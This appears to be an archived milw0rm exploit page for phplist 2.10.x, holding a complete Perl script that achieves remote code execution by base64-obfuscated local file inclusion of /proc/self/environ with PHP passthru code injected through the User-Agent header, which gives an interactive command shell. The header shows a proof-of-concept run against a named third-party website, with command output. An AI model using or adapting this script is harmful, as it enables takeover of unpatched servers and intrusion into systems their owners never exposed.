<html><head><title>phplist 2.10.x (RCE by environ inclusion) Local File Inclusion Exploit</title></head><pre># phplist 2.10.x remote code execution
# Credit:AmnPardaz Security Research Team for the vuln
# exploit author mozi2weed@yahoo.com
#
# Poc
#[root@server pentest]# perl phplistrce.pl http://www.helpcenter.it/list/
#phplist 2.10.x 0day RCE may b others by mozi: uname -a
#686 i686 i386 GNU/Linux
#mozi: w
# 04:43:41 up 108 days, 21:20,  0 users,  load average: 0.24, 0.29, 0.28
#USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
#mozi:
#
#
Exploit Code:
[root@server pentest]# cat phplistrce.pl
#!/usr/bin/perl -w
use strict;
use LWP 5.64;
use LWP::UserAgent;
use MIME::Base64;


print &quot;phplist 2.10.x 0day RCE may b others by &quot;;

my $browser = LWP::UserAgent-&gt;new;
my $url1 = $ARGV[0];
my ($line,$response);


my $url .= &quot;L2FkbWluL2luZGV4LnBocD9fU0VSVkVSW0NvbmZpZ0ZpbGVdPS4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3Byb2Mvc2VsZi9lbnZpcm9u&quot;;
my $decode = decode_base64($url);

my $all = $url1.$decode;

print &quot;mozi: &quot;;
while( $line = &lt;STDIN&gt;) {
chop($line);
$browser-&gt;agent(&quot;mozi&lt;?passthru('$line 2&gt; /dev/stdout');?&gt;mozi&quot;);
$response = $browser-&gt;get( $all );
if ($response-&gt;content =~ /mozi(.*)mozi/s) {
print $1;
}
print &quot;mozi: &quot;;
}

# milw0rm.com [2009-01-28]</pre></html>